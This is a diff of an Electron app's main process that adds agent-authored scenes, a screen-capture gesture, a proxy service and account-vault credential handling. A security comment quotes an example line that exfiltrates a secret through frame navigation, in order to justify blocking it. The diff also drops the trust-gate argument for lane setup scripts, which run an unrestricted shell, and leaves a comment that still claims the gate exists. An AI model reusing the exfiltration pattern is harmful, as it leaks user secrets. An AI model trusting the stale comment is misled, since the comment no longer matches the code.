@@ -32,6 +32,7 @@ logMachineEvent("info", "desktop.main_started", {
   platform: process.platform,
 });
 
+import { UNAVAILABLE_CAPTURE_GESTURE_HEALTH } from "./services/capture/captureGestureState";
 import { AsyncLocalStorage } from "node:async_hooks";
 import os from "node:os";
 import path from "node:path";
@@ -79,10 +80,12 @@ import { detectInstallSource } from "./services/analytics/installSource";
 import {
   captureAgentTurnSettledAnalytics,
   captureChatAutoResumeAnalytics,
+  captureChatHandoffReplayAnalytics,
   captureChatMentionsExpandedAnalytics,
   captureClaudeHooksIgnoredAnalytics,
   captureSessionMetadataRegeneratedAnalytics,
 } from "./services/analytics/agentTurnProductAnalytics";
+import { capturePendingInputDismissedAnalytics } from "./services/analytics/featureProductAnalytics";
 import { initPerfRunFromEnv } from "./services/perf/perfLog";
 import { startMetricsSampler } from "./services/perf/metricsSampler";
 import { registerPerfIpcHandlers } from "./services/perf/perfIpc";
@@ -109,6 +112,7 @@ import { createLaneTemplateService } from "./services/lanes/laneTemplateService"
 import { createLaneWorktreeLockService } from "./services/lanes/laneWorktreeLockService";
 import { createPortAllocationService } from "./services/lanes/portAllocationService";
 import { createLaneProxyService } from "./services/lanes/laneProxyService";
+import { createProxyService, type ProxyService } from "../../../ade-cli/src/services/proxy/proxyService";
 import {
   releaseLaneRuntimeResources,
   teardownArchivedLaneEnvironment,
@@ -170,6 +174,22 @@ import {
   resolveAttentionNotchExecutablePath,
   type AttentionNotchOutput,
 } from "./services/attention/attentionNotchHelper";
+import {
+  CaptureHelper,
+  resolveCaptureHelperExecutablePath,
+} from "./services/capture/captureHelper";
+import type {
+  CaptureGestureFailure,
+  CaptureGestureHealth,
+  CaptureGestureShot,
+} from "../shared/types/captureGesture";
+import { fitCaptureShotToAttachmentLimit } from "./services/capture/captureShotFit";
+import { pickCaptureGestureWindow } from "./services/capture/captureGestureTarget";
+import {
+  reportCaptureGesture,
+  type CaptureGestureOutcome,
+} from "./services/analytics/captureGestureProductAnalytics";
+
 import {
   attentionNotchAppNavigation,
   attentionItemNavigationRequest,
@@ -281,6 +301,7 @@ import { createAutomationService } from "./services/automations/automationServic
 import { createAutomationPlannerService } from "./services/automations/automationPlannerService";
 import { createAutomationSecretService } from "./services/automations/automationSecretService";
 import { createProjectSecretService } from "./services/secrets/projectSecretService";
+import { initApiKeyStore } from "./services/ai/apiKeyStore";
 import { createAutomationIngressService, createKvIngressCursorStore } from "./services/automations/automationIngressService";
 import { createLinearAccessTokenGetter, createLinearIngressService } from "./services/automations/linearIngressService";
 import { buildLinearAutomationDispatches } from "./services/automations/linearAutomationDispatch";
@@ -319,9 +340,15 @@ import {
 import { createRebaseSuggestionService } from "./services/lanes/rebaseSuggestionService";
 import { createAutoRebaseService } from "./services/lanes/autoRebaseService";
 import { createCtoStateService } from "./services/cto/ctoStateService";
+import { createCtoVoiceRuntimeService } from "./services/cto/ctoVoiceRuntimeService";
 import { createCtoMemoryService } from "./services/cto/ctoMemoryService";
 import { createLinearCredentialService } from "./services/cto/linearCredentialService";
-import { buildRendererCspPolicy, shouldApplyRendererCsp } from "./rendererCsp";
+import { createAccountVaultBridge } from "./services/account/accountVaultBridge";
+import {
+  buildRendererCspPolicy,
+  isRendererFrameNavigationAllowed,
+  shouldApplyRendererCsp,
+} from "./rendererCsp";
 import {
   RENDERER_RECOVERY_DELAY_MS,
   RENDERER_RECOVERY_WINDOW_MS,
@@ -333,8 +360,8 @@ import { createLinearClient } from "./services/cto/linearClient";
 import { createLinearIssueTracker, type LinearIssueTracker } from "./services/cto/linearIssueTracker";
 import { createLinearLiveStatusService, type LinearLiveStatusService } from "./services/cto/linearLiveStatusService";
 import { createLinearChatLinkPublisher, publishLinearLaneCard } from "./services/cto/linearLaneCardService";
-import { createOrchestrationService } from "./services/orchestration/orchestrationService";
 import { createComputerUseArtifactBrokerService } from "./services/computerUse/computerUseArtifactBrokerService";
+import { sceneDocumentStore } from "./services/scenes/sceneDocumentStore";
 import { createIosSimulatorService } from "./services/ios/iosSimulatorService";
 import { createAppControlService } from "./services/appControl/appControlService";
 import { createBuiltInBrowserService } from "./services/builtInBrowser/builtInBrowserService";
@@ -1073,6 +1100,39 @@ async function createWindow(args: {
     event.preventDefault();
   });
 
+  /**
+   * Scenes navigating themselves.
+   *
+   * A scene is agent-authored code in a sandboxed frame with its own origin and
+   * its own CSP (`connect-src 'none'`, no remote images), so it cannot FETCH
+   * anything out. Navigating the frame is the one route that policy does not
+   * close: `location = "https://elsewhere/?" + secret` is a navigation, not a
+   * fetch. The renderer's own `frame-src` already bounds where a nested
+   * context may go and is the first door; this is the second, because a
+   * `frame-src` widened for some unrelated reason must not silently reopen it.
+   *
+   * Main frames keep the stricter rule above. Subframes are answered by
+   * `isRendererFrameNavigationAllowed`, which iterates the same
+   * `FRAME_SRC_EXTRA_SCHEMES` / `PACKAGED_FRAME_SCHEMES` literals the CSP's
+   * `frame-src` is built from, so there is no hand-copied list to drift. It is
+   * tighter than `frame-src` in one place on purpose: local http is allowed
+   * only while a dev server is configured.
+   */
+  win.webContents.on("will-frame-navigate", (event) => {
+    if (event.isMainFrame) return;
+    const url = event.url;
+    if (
+      isRendererFrameNavigationAllowed(url, {
+        rendererUrl: getRendererUrl(),
+        devServerUrl: process.env.VITE_DEV_SERVER_URL ?? null,
+      })
+    ) {
+      return;
+    }
+    event.preventDefault();
+    args.logger?.warn("window.frame_navigation_blocked", { url });
+  });
+
   let recoveredOutdatedOptimizeDep = false;
   const devBase = process.env.VITE_DEV_SERVER_URL;
   if (devBase) {
@@ -1133,6 +1193,14 @@ protocol.registerSchemesAsPrivileged([
   {
     scheme: "ade-artifact",
     privileges: { standard: false, supportFetchAPI: true, stream: true },
+  },
+  {
+    // Agent-authored scenes. Non-standard on purpose: a non-standard scheme
+    // gives the frame an opaque origin, which is exactly what a document ADE
+    // did not write should get. It never streams because a scene is a single
+    // in-memory string, and it never touches the filesystem at all.
+    scheme: "ade-scene",
+    privileges: { standard: false, supportFetchAPI: true, stream: false },
   },
 ]);
 
@@ -1295,6 +1363,15 @@ app.whenReady().then(async () => {
       normFile === normAllowed || normFile.startsWith(normAllowed + path.sep)
     );
   };
+
+  // Handle ade-scene:// requests — serves agent-authored scenes from memory.
+  // The id in `ade-scene://view/<id>` is a key into `sceneDocumentStore`, never
+  // a path: this scheme has no filesystem reach by construction, so there is no
+  // jail here to widen and none of `ade-artifact`'s allow-root applies to it.
+  protocol.handle("ade-scene", (request) => {
+    const { status, body, headers } = sceneDocumentStore.respond(request.url);
+    return new Response(body, { status, headers });
+  });
 
   // Handle ade-artifact:// requests — serves local files for proof drawer previews.
   // Path is encoded in the URL: ade-artifact:///absolute/path/to/file.png
@@ -1511,6 +1588,36 @@ app.whenReady().then(async () => {
       .filter((entry) => !entry.remote);
 
   const machineAdeLayout = resolveMachineAdeLayout();
+  // One subscription proxy supervisor belongs to this ADE install, not to the
+  // currently-open project. Project contexts all point at the same machine
+  // state.json; keeping the lazy instance here prevents duplicate children and
+  // ensures closing one project cannot stop another project's proxy.
+  let subscriptionProxyService: ProxyService | null = null;
+  const getSubscriptionProxyService = (): ProxyService => {
+    if (!subscriptionProxyService) {
+      subscriptionProxyService = createProxyService({
+        adeHome: machineAdeLayout.adeDir,
+        getAnalytics: () => productAnalyticsService,
+      });
+    }
+    return subscriptionProxyService;
+  };
+  // Machine-scoped API keys (the CTO voice key) belong to this install, not to
+  // whichever project happens to be open — a window with no project bound, a
+  // remote-bound window and the in-process mode all reach the machine-key IPC.
+  // Registered here, at app start, so they never fall through to a project-less
+  // encrypted fallback; and registered with the SHARED file store rather than
+  // `createDesktopCredentialStore`'s safeStorage-primary routed store, because
+  // the headless runtime and the `ade` CLI that must read these keys cannot
+  // decrypt an Electron safeStorage file.
+  {
+    const { initMachineApiKeyStore } = await import("./services/ai/apiKeyStore");
+    initMachineApiKeyStore({
+      credentialStore: new EncryptedFileCredentialStore({
+        secretsDir: machineAdeLayout.secretsDir,
+      }),
+    });
+  }
   const startupState = normalizeStartupProjectState({
     saved,
     additionalRecentProjects: readMachineRegistryRecentProjects(
@@ -1864,6 +1971,11 @@ app.whenReady().then(async () => {
         });
       }
     },
+  });
+  const accountVaultBridge = createAccountVaultBridge({
+    getPool: () => localRuntimePool,
+    getRootPath: () => bootedUsageScopeRoot([...projectContexts.values()]),
+    logger: localRuntimeLogger,
   });
   // Carry this machine's OS-level suspend/resume into the brain, which has no
   // such hook of its own and owns the account-directory publisher. Registered
@@ -2924,15 +3036,18 @@ app.whenReady().then(async () => {
     const hadAdeDir = fs.existsSync(path.join(projectRoot, ".ade", "ade.db"));
     const scaffoldedFirstOpen = consumeFirstOpenStabilityMarker(projectRoot);
     const adePaths = ensureAdeDirs(projectRoot);
-    const { initApiKeyStore } = await import("./services/ai/apiKeyStore");
-    initApiKeyStore(projectRoot, {
-      credentialStore: createDesktopCredentialStore(machineAdeLayout.secretsDir),
-    });
     const logger = createFileLogger(path.join(adePaths.logsDir, "main.jsonl"));
     registerAccountConfigProjectRoot(projectRoot);
     const accountAuthService = getSharedAccountAuthService({
       projectRoots: () => [projectRoot],
       logger,
+    });
+    initApiKeyStore(projectRoot, {
+      credentialStore: createDesktopCredentialStore(machineAdeLayout.secretsDir),
+      getAccountVault: () => accountVaultBridge,
+      getAccountUserId: () => accountAuthService.getStatus().userId,
+      logger,
+      analytics: productAnalyticsService,
     });
     const getAccountAccessToken = () => getSignedInAccountAccessToken(accountAuthService);
     const diskPressureMonitor = createDiskPressureMonitor({
@@ -3282,7 +3397,11 @@ app.whenReady().then(async () => {
       db,
       logger,
     });
-    const projectSecretService = createProjectSecretService(projectRoot);
+    const projectSecretService = createProjectSecretService(projectRoot, {
+      getAccountVault: () => accountVaultBridge,
+      getAccountUserId: () => accountAuthService.getStatus().userId,
+      logger,
+    });
 
     const laneEnvironmentService = createLaneEnvironmentService({
       projectRoot,
@@ -3292,7 +3411,6 @@ app.whenReady().then(async () => {
         emitProjectEvent(projectRoot, IPC.lanesEnvEvent, ev),
       // Setup scripts run unrestricted shell and can come from repo-committed
       // shared config, so the executor gets the same trust gate test suites use.
-      projectConfigService,
     });
 
     const laneTemplateService = createLaneTemplateService({
@@ -3672,8 +3790,6 @@ app.whenReady().then(async () => {
     });
     prPollingServiceRef = prPollingService;
 
-    let orchestrationServiceRef: ReturnType<typeof createOrchestrationService> | null =
-      null;
     const prSummaryService = createPrSummaryService({
       db,
       logger,
@@ -3905,6 +4021,18 @@ app.whenReady().then(async () => {
       adeDir: adePaths.adeDir,
       logger,
       credentialStore: linearCredentialStore,
+      getAccountVault: () => accountVaultBridge,
+      getAccountUserId: () => accountAuthService.getStatus().userId,
+      getDeviceId: () => {
+        try {
+          return fs.readFileSync(
+            path.join(machineAdeLayout.secretsDir, "sync-device-id"),
+            "utf8",
+          ).trim() || null;
+        } catch {
+          return null;
+        }
+      },
     });
     const linearClient = createLinearClient({
       credentials: linearCredentialService,
@@ -3924,11 +4052,11 @@ app.whenReady().then(async () => {
     const agentChatService = createAgentChatService({
       runtimeBudget: chatRuntimeBudget,
       projectRoot,
+      runtimeSocketPath: machineAdeLayout.socketPath,
       transcriptsDir: adePaths.transcriptsDir,
       fileService,
       linearIssueTracker,
       githubService,
-      getOrchestrationService: () => orchestrationServiceRef,
       getSearchService: () => searchServiceHolder.current,
       prService,
       diskPressureMonitor,
@@ -3936,6 +4064,17 @@ app.whenReady().then(async () => {
       // is the only moment a turn in flight can still be told why it is about
       // to stall.
       hostPowerSource: getPowerStateService(),
+      // Machine-wide, not per-project: "Don't ask again" on Claude's
+      // resume-return dialog is a decision about this person's habits, and
+      // asking again in the next project would read as the setting not working.
+      claudeResumeDialogPreference: {
+        isDismissed: () => readGlobalState(globalStatePath).claudeResumeReturnDismissed === true,
+        markDismissed: () => {
+          const state = readGlobalState(globalStatePath);
+          if (state.claudeResumeReturnDismissed === true) return;
+          writeGlobalState(globalStatePath, { ...state, claudeResumeReturnDismissed: true });
+        },
+      },
       getTestService: () => testServiceRef,
       ptyService,
       getAutomationService: () => automationService,
@@ -3985,6 +4124,11 @@ app.whenReady().then(async () => {
         projectId,
         sessionId: event.sessionId,
       }),
+      onChatHandoffReplay: (event) => captureChatHandoffReplayAnalytics({
+        analytics: productAnalyticsService,
+        projectId,
+        event,
+      }),
       onSessionMetadataRegenerated: (event) => captureSessionMetadataRegeneratedAnalytics({
         analytics: productAnalyticsService,
         projectId,
@@ -3993,6 +4137,11 @@ app.whenReady().then(async () => {
       onAutoResumeOutcome: (properties) => captureChatAutoResumeAnalytics({
         analytics: productAnalyticsService,
         properties,
+      }),
+      onPendingInputDismissed: ({ provider }) => capturePendingInputDismissedAnalytics({
+        analytics: productAnalyticsService,
+        surface: "api",
+        provider,
       }),
       onUsageLimitAutoResumed: ({ sessionId, title }) => {
         if (!Notification.isSupported()) return;
@@ -4423,20 +4572,6 @@ app.whenReady().then(async () => {
       "ADE_ENABLE_PORT_ALLOCATION_RECOVERY",
     );
 
-    const orchestrationService = createOrchestrationService({
-      resolveLaneWorktree: (laneId: string): string | undefined => {
-        try {
-          return laneService.getLaneWorktreePath(laneId);
-        } catch {
-          return undefined;
-        }
-      },
-    });
-    orchestrationServiceRef = orchestrationService;
-    // Register the chat-backed outbox drainer now that the orchestration service
-    // exists — before any run can hydrate on boot — so a persisted brief/ping
-    // survives a restart even if no orchestration turn ever runs to lazily wire it.
-    agentChatService.registerOrchestrationOutboxDrainer();
     const computerUseArtifactBrokerService =
       createComputerUseArtifactBrokerService({
         db,
@@ -4585,6 +4720,7 @@ app.whenReady().then(async () => {
         captureAnalytics: (input) => {
           productAnalyticsService.capture(input);
         },
+        captureInternalAnalytics: (input) => productAnalyticsService.captureInternal(input),
       },
     });
     const storageInsightsService = createStorageInsightsService({
@@ -5020,6 +5156,40 @@ app.whenReady().then(async () => {
       mirrorDesktopRecentProjectToMachineCatalog(project.rootPath);
     }
 
+    /*
+     * The in-process twin of the runtime's own voice service — built ONLY when
+     * this desktop is itself the project runtime.
+     *
+     * This constructor is not the test path alone: `ensureProjectContextForMobileSync`
+     * reaches it in production, caches the context, and a later window open
+     * reuses it. Building a call brain there would put a second one in desktop
+     * main while the daemon owns the real one for the same project — two
+     * sockets, two confirm-first holds, two transcripts. A call is the one
+     * service in this context that must not exist twice, so it is gated on the
+     * mode rather than on the constructor being reached.
+     *
+     * Everything else here (`agentChatService` above all) genuinely IS needed by
+     * a mobile-sync context: the phone drives the CTO chat through it.
+     */
+    const ctoVoiceCallService = shouldUseInProcessProjectRuntime()
+      ? createCtoVoiceRuntimeService({
+        projectRoot,
+        logger,
+        laneService,
+        ctoStateService,
+        agentChatService,
+        // The views a call drew: it reads its own stills back out of the store
+        // at hang-up, to name them in the durable record.
+        computerUseArtifactBrokerService,
+        ctoMemoryService,
+        // See the note at the other construction site: a live call owns the CTO
+        // row's status line, because the generated one lands seconds late.
+        sessionService,
+        productAnalyticsService,
+        eventBuffer: rpcEventBuffer,
+      })
+      : null;
+
     // ── ADE RPC Socket Server (embedded mode) ─────────────────────
     const rpcRuntime = {
       projectRoot,
@@ -5040,6 +5210,10 @@ app.whenReady().then(async () => {
       laneTemplateService,
       portAllocationService,
       laneProxyService,
+      getProxyService: getSubscriptionProxyService,
+      get proxyService(): ProxyService | null {
+        return subscriptionProxyService;
+      },
       oauthRedirectService,
       runtimeDiagnosticsService,
       rebaseSuggestionService,
@@ -5062,6 +5236,7 @@ app.whenReady().then(async () => {
       externalSessionsService,
       ctoStateService,
       ctoMemoryService,
+      ctoVoiceCallService,
       linearCredentialService,
       linearIssueTracker,
       githubService,
@@ -5279,6 +5454,7 @@ app.whenReady().then(async () => {
         storageInsightsService,
         budgetCapService,
         autoUpdateService,
+        getProxyService: getSubscriptionProxyService,
         isPackaged: app.isPackaged,
       } as unknown as AdeRuntime;
     }
@@ -5303,6 +5479,10 @@ app.whenReady().then(async () => {
       laneTemplateService,
       portAllocationService,
       laneProxyService,
+      getProxyService: getSubscriptionProxyService,
+      get proxyService(): ProxyService | null {
+        return subscriptionProxyService;
+      },
       oauthRedirectService,
       runtimeDiagnosticsService,
       rebaseSuggestionService,
@@ -5342,7 +5522,6 @@ app.whenReady().then(async () => {
       budgetCapService,
       syncHostService: syncService.getHostService(),
       syncService,
-      orchestrationService,
       agentChatService,
       projectConfigService,
       projectSecretService,
@@ -5350,6 +5529,7 @@ app.whenReady().then(async () => {
       testService,
       ctoStateService,
       ctoMemoryService,
+      ctoVoiceCallService,
       adeProjectService,
       linearCredentialService,
       linearIssueTracker,
@@ -5488,6 +5668,9 @@ app.whenReady().then(async () => {
           broadcast(IPC.usageEvent, snapshot);
         },
         projectRoot: normalizedRoot || null,
+        dependencies: {
+          captureInternalAnalytics: (input) => productAnalyticsService.captureInternal(input),
+        },
       });
     }
     return {
@@ -5511,6 +5694,7 @@ app.whenReady().then(async () => {
       laneTemplateService: null,
       portAllocationService: null,
       laneProxyService: null,
+      getProxyService: getSubscriptionProxyService,
       oauthRedirectService: null,
       runtimeDiagnosticsService: null,
       rebaseSuggestionService: null,
@@ -5548,7 +5732,6 @@ app.whenReady().then(async () => {
       budgetCapService: null,
       syncHostService: null,
       syncService: null,
-      orchestrationService: null,
       projectConfigService: null,
       projectSecretService: null,
       sessionDeltaService: null,
@@ -5871,6 +6054,13 @@ app.whenReady().then(async () => {
     }
     try {
       ctx.ptyService?.disposeAll();
+    } catch {
+      // ignore
+    }
+    // Before the chat service is gone is too late — a live call holds the CTO
+    // in confirm-first mode, and a project closed mid-call must give that back.
+    try {
+      ctx.ctoVoiceCallService?.dispose();
     } catch {
       // ignore
     }
@@ -6726,6 +6916,18 @@ app.whenReady().then(async () => {
   let quitConfirmationInFlight = false;
   let shutdownForceTimer: NodeJS.Timeout | null = null;
   let attentionNotchHelper: AttentionNotchHelper | null = null;
+  let captureHelper: CaptureHelper | null = null;
+  /**
+   * The ADE window the user was last in.
+   *
+   * Recorded here rather than derived on demand because the capture gesture
+   * fires while ADE is in the background — `BrowserWindow.getFocusedWindow()`
+   * is null at exactly the moment the answer is needed.
+   */
+  let lastFocusedAdeWindowId: number | null = BrowserWindow.getFocusedWindow()?.id ?? null;
+  app.on("browser-window-focus", (_event, window) => {
+    if (!window.isDestroyed()) lastFocusedAdeWindowId = window.id;
+  });
 
   const shutdownOpenCodeServersBestEffort = (): void => {
     try {
@@ -6790,6 +6992,12 @@ app.whenReady().then(async () => {
     }
     attentionNotchHelper = null;
     try {
+      captureHelper?.dispose();
+    } catch {
+      // ignore
+    }
+    captureHelper = null;
+    try {
       autoUpdateService?.dispose();
     } catch {
       // ignore
@@ -6810,9 +7018,20 @@ app.whenReady().then(async () => {
     } catch {
       // ignore
     }
-
     const contexts = new Set<AppContext>(projectContexts.values());
     contexts.add(getActiveContext());
+
+    // The subscription proxy is machine-scoped and is deliberately not part of
+    // per-context disposal. Quit is the one owner-level teardown that stops it.
+    if (subscriptionProxyService) {
+      try {
+        void subscriptionProxyService.dispose().catch(() => {
+          // Shutdown is best effort; the process is already leaving.
+        });
+      } catch {
+        // ignore
+      }
+    }
 
     for (const ctx of contexts) {
       try {
@@ -8231,6 +8450,86 @@ app.whenReady().then(async () => {
     onOutput: handleAttentionNotchOutput,
     onRefreshRequested: requestAttentionNotchRefresh,
   });
+
+  /**
+   * Where a capture lands. The order is `pickCaptureGestureWindow`; what main
+   * adds is the liveness filter, which only Electron can answer.
+   * `lastFocusedAdeWindowId` remembers the window the user was last in.
+   */
+  const captureGestureWindow = (): BrowserWindow | null => {
+    const liveWindows = BrowserWindow.getAllWindows().filter(
+      (win) => !win.isDestroyed() && !win.webContents.isDestroyed(),
+    );
+    const focused = BrowserWindow.getFocusedWindow();
+    const candidate = pickCaptureGestureWindow({
+      liveWindows,
+      // A focused window that is mid-teardown is not a target.
+      focused: focused && !focused.isDestroyed() && !focused.webContents.isDestroyed() ? focused : null,
+      lastFocusedId: lastFocusedAdeWindowId,
+    });
+    if (!candidate || candidate.isDestroyed() || candidate.webContents.isDestroyed()) return null;
+    return candidate;
+  };
+
+  /** Both halves live in services; main keeps only the call sites. */
+  const reportCapture = (outcome: CaptureGestureOutcome): void =>
+    reportCaptureGesture(productAnalyticsService, outcome);
+
+  captureHelper = new CaptureHelper({
+    executablePath: resolveCaptureHelperExecutablePath({
+      isPackaged: app.isPackaged,
+      resourcesPath: process.resourcesPath,
+      appPath: app.getAppPath(),
+    }),
+    logger: getActiveContext().logger,
+    // Under the OS temp root rather than userData: these PNGs are a handoff
+    // between two processes that lasts milliseconds, and the supervisor deletes
+    // each one as it reads it. `windows-uninstall-cleanup.ps1` sweeps the
+    // directory for the case where ADE was killed in between.
+    // Per channel, not shared. os.tmpdir() is per-user, so Stable, Beta and
+    // Alpha all landed on one directory — and `dispose()` removes it, so
+    // quitting one channel broke captures in another that was still running.
+    outputDirectory: path.join(
+      app.getPath("temp"),
+      // `?? "stable"` alone put an unpackaged dev build in the installed
+      // Stable build's directory — and `CaptureHelper.dispose()` deletes that
+      // directory outright, so quitting one broke captures in the other.
+      `ade-capture-${normalizeAdePackageChannel(process.env.ADE_PACKAGE_CHANNEL) ?? (app.isPackaged ? "stable" : "dev")}`,
+    ),
+    onShot: (shot: CaptureGestureShot) => {
+      const target = captureGestureWindow();
+      if (!target) return;
+      const fitted = fitCaptureShotToAttachmentLimit(shot, {
+        fromBuffer: (bytes) => nativeImage.createFromBuffer(bytes),
+      });
+      if (!fitted) {
+        reportCapture("too_large");
+        target.webContents.send(IPC.captureGestureFailed, {
+          reason: "capture-failed",
+          source: shot.source,
+          message: "That screen is too large to attach, even scaled down.",
+        } satisfies CaptureGestureFailure);
+        return;
+      }
+      // Bring ADE forward BEFORE the event: the renderer's fly-in animation is
+      // pointless behind another app's window, and the whole gesture means
+      // "take me to the CTO with this".
+      activateAppForAttentionNotch();
+      foregroundAttentionWindow(target);
+      target.webContents.send(IPC.captureGestureShot, fitted);
+      reportCapture("delivered");
+    },
+    onFailure: (failure: CaptureGestureFailure) => {
+      const target = captureGestureWindow();
+      if (!target) return;
+      // A failure does NOT steal focus. The user pressed a chord over someone
+      // else's window; yanking them into ADE to read "there was no window in
+      // front" is worse than the failure.
+      target.webContents.send(IPC.captureGestureFailed, failure);
+      // The coarse fact only; `failure.reason` and its message stay local.
+      reportCapture("failed");
+    },
+  });
   // Sleep does not always lock the machine, so resume must clear suspension
   // without overriding the independent lock state.
   let notchScreenLocked = false;
@@ -8255,6 +8554,17 @@ app.whenReady().then(async () => {
     syncNotchScreenState();
   });
 
+  // The account bridge is available on the welcome screen, before any project
+  // context has initialized the API-key service. Bind the machine credential
+  // store once here so a sign-out from that screen still purges account keys.
+  initApiKeyStore(path.dirname(machineAdeLayout.adeDir), {
+    credentialStore: createDesktopCredentialStore(machineAdeLayout.secretsDir),
+    getAccountUserId: () => getSharedAccountAuthService({
+      secretsDir: machineAdeLayout.secretsDir,
+    }).getStatus().userId,
+    analytics: productAnalyticsService,
+  });
+
   attentionIpcBridge = registerIpc({
     getCtx: () => {
       const ctx = getActiveContext();
@@ -8276,6 +8586,36 @@ app.whenReady().then(async () => {
       const contexts = new Set<AppContext>(projectContexts.values());
       contexts.add(getActiveContext());
       return Array.from(contexts);
+    },
+    purgeClosedAccountCredentials: () => {
+      const knownRoots = new Set<string>([
+        ...readLocalRecentProjects().map((entry) => entry.rootPath),
+        ...attemptedProjectRoots.list(),
+      ]);
+      for (const projectRoot of knownRoots) {
+        const normalizedRoot = normalizeProjectRoot(projectRoot);
+        if (projectContexts.has(normalizedRoot)) continue;
+        const adeDir = resolveAdeLayout(normalizedRoot).adeDir;
+        try {
+          createProjectSecretService(normalizedRoot).purgeAccountCredentials();
+        } catch (error) {
+          getActiveContext().logger.warn("account.closed_project_secrets_purge_failed", {
+            projectRoot: normalizedRoot,
+            error: error instanceof Error ? error.message : String(error ?? ""),
+          });
+        }
+        try {
+          createLinearCredentialService({
+            adeDir,
+            credentialStore: createDesktopCredentialStore(path.join(adeDir, "secrets")),
+          }).purgeAccountCredentials();
+        } catch (error) {
+          getActiveContext().logger.warn("account.closed_project_linear_purge_failed", {
+            projectRoot: normalizedRoot,
+            error: error instanceof Error ? error.message : String(error ?? ""),
+          });
+        }
+      }
     },
     getSyncService: () => {
       return getMobileSyncService();
@@ -8307,6 +8647,15 @@ app.whenReady().then(async () => {
     releaseRepository: packagedReleaseRepository,
     builtInBrowserService,
     productAnalyticsService,
+    updateCaptureGestureSettings: (settings): CaptureGestureHealth => {
+      captureHelper?.updateSettings(settings);
+      return captureHelper?.getHealth() ?? UNAVAILABLE_CAPTURE_GESTURE_HEALTH;
+    },
+    getCaptureGestureHealth: (): CaptureGestureHealth =>
+      captureHelper?.getHealth() ?? UNAVAILABLE_CAPTURE_GESTURE_HEALTH,
+    retryCaptureGesture: (): CaptureGestureHealth =>
+      captureHelper?.retry() ?? UNAVAILABLE_CAPTURE_GESTURE_HEALTH,
+    captureGestureNow: (): boolean => captureHelper?.captureNow() ?? false,
     publishAttentionNotchSnapshot: (snapshot: AttentionSnapshot) => {
       latestAttentionNotchSnapshot = snapshot;
       attentionNotchHelper?.publishSnapshot(snapshot);
